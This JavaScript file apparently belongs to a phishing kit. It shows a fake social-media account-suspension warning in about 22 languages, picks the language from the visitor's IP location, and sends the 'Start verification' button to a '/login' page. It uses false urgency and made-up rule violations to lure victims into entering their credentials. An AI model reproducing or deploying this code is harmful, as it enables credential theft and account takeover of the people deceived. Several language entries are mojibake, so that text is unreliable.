// ---------- TRANSLATIONS ----------
const TRANSLATIONS = {
  'de': {
    title: 'Ihr Konto wird für 24 Stunden gesperrt.',
    description: 'Unser System hat ungewöhnliche Aktivitäten auf Ihrem Konto festgestellt, die gegen die Regeln für Bilder und Beiträge verstoßen könnten.',
    step1: 'Bitte überprüfen und folgen Sie den angegebenen Schritten.',
    step2: 'Um eine Kontosperrung zu vermeiden, haben Sie noch 24 Stunden, um zu verifizieren und Einspruch einzulegen.',
    btn: 'Überprüfung starten',
    restricted: 'Ihr Konto wurde am '
  },
  'nl': {
    title: 'Uw account wordt 24 uur geblokkeerd.',
    description: 'Ons systeem heeft ongebruikelijke activiteiten op uw account gedetecteerd die mogelijk in strijd zijn met de regels voor afbeeldingen en berichten.',
    step1: 'Controleer en volg de aangegeven stappen.',
    step2: 'Om blokkering van uw account te voorkomen, heeft u nog 24 uur om te verifiëren en in beroep te gaan.',
    btn: 'Start verificatie',
    restricted: 'Uw account werd op '
  },
  'ja': {
    title: '¢«¦óÈo24B“ÖíÃ¯UŒ~Y',
    description: 'S>n·¹Æào¢«¦óÈkp8j¢¯Æ£ÓÆ£’úW~W_;Ï„•?k¢Y‹GkUÍWfD‹ïý'LBŠ~Y',
    step1: ':UŒ_K’ºWf“cfO`UD',
    step2: '¢«¦óÈnÖíÃ¯’Q‹_ºhpp3WËfn_k‹Š24B“LBŠ~Y',
    btn: 'º’‹Ë',
    restricted: 'Bj_n¢«¦óÈo!nåk6PUŒ~W_'
  },
  'bg': {
    title: '0H8OB 0:0C=B I5 1J45 1;>:8@0= 70 24 G0A0.',
    description: '0H0B0 A8AB5<0 >B:@8 =5>18G09=0 0:B82=>AB 2 0:0C=B0 28, :>5B> <>65 40 =0@CH020 ?@028;0B0 70 87>1@065=8O 8 ?C1;8:0F88.',
    step1: '>;O, ?@>25@5B5 8 A;54209B5 C:070=8B5 ABJ?:8.',
    step2: '0 40 87153=5B5 1;>:8@0=5B> =0 0:0C=B0, 8<0B5 24 G0A0 40 ?>B2J@48B5 8 >160;20B5.',
    btn: '0?>G=5B5 ?>B2J@64020=5B>',
    restricted: '0H8OB 0:0C=B 5 >3@0=8G5= =0 '
  },
  'pt': {
    title: 'Sua conta será bloqueada por 24 horas.',
    description: 'Nosso sistema detectou atividade incomum na sua conta, o que pode violar as regras sobre imagens e postagens.',
    step1: 'Por favor, verifique e siga os passos indicados.',
    step2: 'Para evitar o bloqueio da conta, você tem 24 horas para verificar e recorrer.',
    btn: 'Iniciar verificação',
    restricted: 'Sua conta foi restringida em '
  },
  'en': {
    title: 'Your account will be blocked for 24 hours.',
    description: 'Our system detected unusual activity on your account which may violate image and posting rules.',
    step1: 'Please check and follow the indicated steps.',
    step2: 'To avoid account blocking, you have 24 hours left to verify and appeal.',
    btn: 'Start verification',
    restricted: 'Your account was restricted on '
  },
  'el': {
    title: 'Ÿ »¿³±Á¹±Ã¼ÌÂ Ã±Â ¸± ¼À»¿º±Á¹ÃÄµ¯ ³¹± 24 ÎÁµÂ.',
    description: '¤¿ ÃÍÃÄ·¼¬ ¼±Â ±½¯Ç½µÅÃµ ±ÃÅ½®¸¹ÃÄ· ´Á±ÃÄ·Á¹ÌÄ·Ä± ÃÄ¿ »¿³±Á¹±Ã¼Ì Ã±Â, · ¿À¿¯± µ½´­ÇµÄ±¹ ½± À±Á±²¹¬¶µ¹ Ä¿ÅÂ º±½¿½¹Ã¼¿ÍÂ ÃÇµÄ¹º¬ ¼µ Ä¹Â µ¹ºÌ½µÂ º±¹ Ä¹Â ±½±ÁÄ®Ãµ¹Â.',
    step1: ' ±Á±º±»¿Í¼µ µ»­³¾Äµ º±¹ ±º¿»¿Å¸®ÃÄµ Ä± ÅÀ¿´µ¹º½ÅÌ¼µ½± ²®¼±Ä±.',
    step2: '“¹± ½± ±À¿ÆÍ³µÄµ Ä¿ ¼À»¿º¬Á¹Ã¼± Ä¿Å »¿³±Á¹±Ã¼¿Í, ­ÇµÄµ 24 ÎÁµÂ ½± µÀ±»·¸µÍÃµÄµ º±¹ ½± º¬½µÄµ ­ÆµÃ·.',
    btn: 'žµº¹½®ÃÄµ Ä·½ µÀ±»®¸µÅÃ·',
    restricted: 'Ÿ »¿³±Á¹±Ã¼ÌÂ Ã±Â ÀµÁ¹¿Á¯ÃÄ·ºµ ÃÄ¹Â '
  },
  'cs': {
    title: 'Váa úet bude zablokován na 24 hodin.',
    description: 'Náa systém detekoval neobvyklou aktivitu na vaaem útu, co~ mo~e poruaovat pravidla týkající se obrázko a pYíspvko.',
    step1: 'Zkontrolujte a postupujte podle uvedených kroko.',
    step2: 'Aby se zabránilo zablokování útu, máte 24 hodin na ovYení a odvolání.',
    btn: 'Zahájit ovYení',
    restricted: 'Váa úet byl omezen dne '
  },
  'da': {
    title: 'Din konto bliver låst i 24 timer.',
    description: 'Vores system har registreret usædvanlig aktivitet på din konto, som muligvis kan overtræde reglerne for billeder og opslag.',
    step1: 'Kontroller venligst og følg de angivne trin.',
    step2: 'For at undgå kontolåsning har du 24 timer til at bekræfte og appellere.',
    btn: 'Start verifikation',
    restricted: 'Din konto blev begrænset den '
  },
  'es': {
    title: 'Tu cuenta será bloqueada durante 24 horas.',
    description: 'Nuestro sistema detectó actividad inusual en tu cuenta, lo que puede violar las normas sobre imágenes y publicaciones.',
    step1: 'Por favor, verifica y sigue los pasos indicados.',
    step2: 'Para evitar el bloqueo, tienes 24 horas para verificar y apelar.',
    btn: 'Iniciar verificación',
    restricted: 'Tu cuenta fue restringida el '
  },
  'fi': {
    title: 'Tiliisi estetään 24 tunniksi.',
    description: 'Järjestelmämme on havainnut epätavallista toimintaa tililläsi, mikä saattaa rikkoa kuvien ja julkaisujen sääntöjä.',
    step1: 'Tarkista ja noudata annettuja ohjeita.',
    step2: 'Vältä tilin estämistä, sinulla on 24 tuntia aikaa vahvistaa ja valittaa.',
    btn: 'Aloita vahvistus',
    restricted: 'Tilisi rajoitettiin '
  },
  'hu': {
    title: 'A fiókja 24 órára le lesz tiltva.',
    description: 'Rendszerünk szokatlan tevékenységet észlelt a fiókján, amely megsértheti a képekkel és bejegyzésekkel kapcsolatos szabályokat.',
    step1: 'Kérjük, ellenQrizze és kövesse az utasított lépéseket.',
    step2: 'A fiók letiltásának elkerülése érdekében 24 órája van a megerQsítésre és fellebbezésre.',
    btn: 'MegerQsítés indítása',
    restricted: 'A fiókja korlátozva lett '
  },
  'it': {
    title: 'Il tuo account sarà bloccato per 24 ore.',
    description: 'Il nostro sistema ha rilevato attività insolite nel tuo account, che potrebbero violare le regole relative alle immagini e ai post.',
    step1: 'Controlla e segui i passaggi indicati.',
    step2: 'Per evitare il blocco dell\'account, hai 24 ore per verificare e fare ricorso.',
    btn: 'Inizia la verifica',
    restricted: 'Il tuo account è stato limitato il '
  },
  'no': {
    title: 'Kontoen din vil bli blokkert i 24 timer.',
    description: 'Systemet vårt har oppdaget uvanlig aktivitet på kontoen din, noe som kan bryte med regler for bilder og innlegg.',
    step1: 'Vennligst sjekk og følg de angitte trinnene.',
    step2: 'For å unngå blokkering av kontoen, har du 24 timer på deg til å bekrefte og anke.',
    btn: 'Start bekreftelse',
    restricted: 'Kontoen din ble begrenset den '
  },
  'pl': {
    title: 'Twoje konto zostanie zablokowane na 24 godziny.',
    description: 'Nasz system wykryB nietypow aktywno[ na Twoim koncie, co mo|e narusza zasady dotyczce obrazów i postów.',
    step1: 'Prosz sprawdzi i postpowa zgodnie z podanymi krokami.',
    step2: 'Aby unikn blokady konta, masz 24 godziny na weryfikacj i odwoBanie.',
    btn: 'Rozpocznij weryfikacj',
    restricted: 'Twoje konto zostaBo ograniczone '
  },
  'sv': {
    title: 'Ditt konto kommer att blockeras i 24 timmar.',
    description: 'Vårt system har upptäckt ovanlig aktivitet på ditt konto som kan bryta mot reglerna för bilder och inlägg.',
    step1: 'Vänligen kontrollera och följ de angivna stegen.',
    step2: 'För att undvika blockering av kontot har du 24 timmar på dig att verifiera och överklaga.',
    btn: 'Starta verifiering',
    restricted: 'Ditt konto begränsades den '
  },
  'th': {
    title: '1
5-809%G-@G@'%2 24 
1H'B!.',
    description: '#0-@#2DI#'4##!5HD!H4C1
5-86H-2%0@!4@5H"'1 2A%0B*L.',
    step1: '#82#'*-A%032!1I-5HA*.',
    step2: '@7H-+%5@%5H"2#%G-1
5-8, 8!5@'%2 24 
1H'B!C2#"7"1A%0-8#L.',
    btn: '@#4H!2#"7"1',
    restricted: '1
5-8931@!7H-'15H '
  },
  'tr': {
    title: 'Hesab1n1z 24 saat boyunca engellenecek.',
    description: 'Sistemimiz, hesab1n1zda olaand1_1 etkinlik tespit etti, bu durum görüntü ve gönderi kurallar1n1 ihlal edebilir.',
    step1: 'Lütfen kontrol edin ve belirtilen ad1mlar1 izleyin.',
    step2: 'Hesap engellemesini önlemek için, dorulamak ve itirazda bulunmak için 24 saatiniz kald1.',
    btn: 'Dorulamay1 ba_lat',
    restricted: 'Hesab1n1z _u tarihte k1s1tland1 '
  },
  'zh': {
    title: '¨„7«š24ö',
    description: 'ì„ûßÀK0¨„7	8;¨ïýÝÍ	sþGŒÑ„Ä',
    step1: '÷Àåv	g:e¤Í\',
    step2: ':M7«š¨	24ö„öôÛLŒÁŒ3É',
    btn: ' ËŒÁ',
    restricted: '¨„7(åå«P6'
  },
  'ro': {
  title: 'Contul tu va fi blocat timp de 24 de ore.',
  description: 'Sistemul nostru a detectat activiti neobinuite în contul tu, care pot înclca regulile privind imaginile i postrile.',
  step1: 'Te rugm s verifici i s urmezi paii indicai.',
  step2: 'Pentru a evita blocarea contului, ai la dispoziie doar 24 de ore pentru a verifica i a face apel.',
  btn: 'Începe verificarea',
  restricted: 'Contul tu a fost restricionat la data de '
  },
  'fr': {
  title: 'Votre compte sera bloqué pendant 24 heures.',
  description: 'Notre système a détecté une activité inhabituelle sur votre compte, ce qui peut constituer une violation des règles concernant les images et les publications.',
  step1: 'Veuillez vérifier et suivre les étapes indiquées.',
  step2: 'Pour éviter le blocage du compte, il vous reste 24 heures pour vérifier et faire appel.',
  btn: 'Commencer la vérification',
  restricted: 'Votre compte a été restreint le '
  },
  'vi': {
    title: 'Tài kho£n cça b¡n s½ bË khóa trong 24 giÝ.',
    description: 'HÇ thÑng phát hiÇn ho¡t Ùng b¥t th°Ýng trong tài kho£n cça b¡n, có thÃ vi ph¡m quy Ënh vÁ hình £nh và bài ng.',
    step1: 'Vui lòng kiÃm tra và làm theo các b°Ûc h°Ûng d«n.',
    step2: 'Ã tránh bË khóa tài kho£n, b¡n còn 24 giÝ Ã xác minh và kháng cáo.',
    btn: 'B¯t §u xác minh',
    restricted: 'Tài kho£n cça b¡n ã bË h¡n ch¿ vào ngày '
  }
};

// Map common full locales or country codes to the translation keys
  const countryToLanguage = {
    AT: 'de', BE: 'nl', JP: 'ja', BG: 'bg', BR: 'pt', CA: 'en', CY: 'el',
    CZ: 'cs', DE: 'de', DK: 'da', ES: 'es', FI: 'fi', FR: 'fr', GB: 'en',
    GR: 'el', HU: 'hu', IT: 'it', NL: 'nl', NO: 'no', PL: 'pl', PT: 'pt',
    RO: 'ro', SE: 'sv', TH: 'th', TR: 'tr', TW: 'zh', US: 'en', VN: 'vi'
  };

// Detect language by IP
async function detectLanguageByIP() {
  try {
    const resp = await fetch('https://get.geojs.io/v1/ip/geo.json');
    if (!resp.ok) throw new Error('geoip failed');
    const data = await resp.json();
    if (data.country_code && countryToLanguage[data.country_code]) {
      console.log("IP country:", data.country_code, "’", countryToLanguage[data.country_code]);
      return countryToLanguage[data.country_code];
    }
  } catch (e) {
    console.warn('GeoIP detection failed:', e);
  }
  return null;
}

function applyTranslations(lang) {
  const t = TRANSLATIONS[lang] || TRANSLATIONS['en'];
  document.getElementById('title').textContent = t.title;
  document.getElementById('description').textContent = t.description;
  document.getElementById('step1').textContent = t.step1;
  document.getElementById('step2').textContent = t.step2;
  document.getElementById('continueBtn').textContent = t.btn;
  const restrictedEl = document.getElementById('restrictedText');
  restrictedEl.childNodes[0].nodeValue = t.restricted;
}

function formatDateForLocale(date, lang) {
  const LOCALE_MAP = { vi: 'vi-VN', en: 'en-US', fr: 'fr-FR', es: 'es-ES', ja: 'ja-JP' };
  const locale = LOCALE_MAP[lang] || 'en-US';
  return date.toLocaleDateString(locale, { day: 'numeric', month: 'long', year: 'numeric' });
}

// Init
(async function init() {
  let lang = await detectLanguageByIP();
  if (!lang) lang = "en"; // fallback m·c Ënh ti¿ng Anh

  applyTranslations(lang);

  const date = new Date();
  document.getElementById('currentDate').textContent = formatDateForLocale(date, lang);

document.getElementById('continueBtn').addEventListener('click', function() {
    window.location.href = '/login';
});
})();